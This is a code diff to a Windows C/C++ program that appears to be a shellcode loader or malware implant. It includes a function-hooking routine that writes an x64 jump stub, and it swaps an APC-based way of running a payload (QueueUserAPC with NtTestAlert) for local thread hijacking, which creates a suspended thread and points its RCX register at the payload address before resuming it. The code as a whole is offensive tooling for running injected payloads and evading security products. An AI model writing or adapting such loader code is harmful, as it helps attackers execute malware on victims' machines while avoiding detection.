@@ -12,6 +12,10 @@ void DoNothing() {
 	while (true) Sleep(10 * 1000);
 }
 
+void Dummy() {
+	Sleep(0);
+}
+
 void InstallHook(PVOID address, PVOID jump) {
 	BYTE Jump[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
 
@@ -131,10 +135,27 @@ BOOL main() {
 		return -1;
 	}
 
-	// QueueUserAPC
-	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payloadAddress;
-	DWORD queueUserApcResult = QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
-	pNtTestAlert();
+	// Local thread hijacking
+	HANDLE hThread = NULL;
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&Dummy, NULL, CREATE_SUSPENDED, NULL);
+	if (hThread == NULL) {
+		return -1;
+	}
+
+	LPCONTEXT pContext = new CONTEXT();
+	pContext->ContextFlags = CONTEXT_INTEGER;
+
+	if (!GetThreadContext(hThread, pContext)) {
+		return -1;
+	}
+	pContext->Rcx = (DWORD64)payloadAddress;
+
+	if (!SetThreadContext(hThread, pContext)) {
+		return -1;
+	}
+
+	ResumeThread(hThread);
+	WaitForSingleObject(hThread, 1000);
 
 	return 0;
 
